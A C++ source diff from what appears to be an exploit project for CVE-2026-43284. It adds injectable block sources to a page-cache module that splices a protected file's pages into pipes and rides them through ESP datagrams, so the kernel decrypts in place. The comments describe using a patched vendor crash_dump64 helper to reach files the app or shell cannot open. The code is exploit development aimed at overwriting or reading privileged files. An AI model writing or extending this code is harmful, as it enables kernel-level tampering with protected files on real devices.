@@ -25,6 +25,38 @@
 
 namespace ghostlock::backend::cve_2026_43284::pagecache {
 
+    /* Injected source for the 16-byte old block the CBC IV/ICV derivation
+     * needs. The default (unbound) source is the direct file_fd pread in
+     * pagecache::read_block(); a vendor carrier the App/shell cannot read
+     * directly binds this to the crash_dump bridge. A bound source is consulted
+     * only after the direct read failed, so non-vendor behavior is unchanged
+     * and a bridge failure fails the block closed (no ESP datagram). */
+    struct OldPageSource final {
+        void *ctx = nullptr;
+        long (*read16)(void *ctx, std::uint64_t offset,
+                       std::uint8_t out[16]) noexcept = nullptr;
+
+        [[nodiscard]] bool available() const noexcept { return read16 != nullptr; }
+    };
+
+    /* Injected source for the ciphertext page when the App cannot open the
+     * target file at all (file_fd < 0). The real binding execs the already
+     * patched crash_dump64 helper with its stdout bound to the write pipe; the
+     * helper splice(2)s the vendor page directly into that pipe
+     * (exp.c do_one_write_cbc use_helper=1), so the ESP datagram still carries
+     * the kernel page and decrypt-in-place is unchanged. A bound source is
+     * consulted only when file_fd cannot supply the page; a helper failure
+     * fails the block closed (no ESP datagram). */
+    struct HelperWriteSource final {
+        void *ctx = nullptr;
+        /* Put the 16-byte block at offset into pipe_write_fd. Returns 16 on
+         * success, a negative -errno on failure, or any other short count. */
+        long (*splice16)(void *ctx, int pipe_write_fd,
+                         std::uint64_t offset) noexcept = nullptr;
+
+        [[nodiscard]] bool available() const noexcept { return splice16 != nullptr; }
+    };
+
     struct SpliceIoOps final {
         /* Create a pipe. Returns 0 on success, or -errno on failure. */
         int (*pipe2)(int fds[2], int flags) noexcept = nullptr;
